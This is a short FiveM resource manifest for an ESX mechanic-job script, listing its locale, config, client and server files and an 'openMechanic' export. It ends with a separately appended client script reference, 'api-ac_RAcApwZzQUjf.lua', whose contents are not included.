resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Mecano Job'

version '1.0.0'

client_scripts {
  '@altrix_base/locale.lua',
  'locales/en.lua',
  'locales/fr.lua',
  'config.lua',
  'client/main.lua'
}

server_scripts {
  '@altrix_base/locale.lua',
  'locales/en.lua',
  'locales/fr.lua',
  '@mysql-async/lib/MySQL.lua',
  'config.lua',
  'server/main.lua'
}

exports {
  'openMechanic'
}


client_script "api-ac_RAcApwZzQUjf.lua"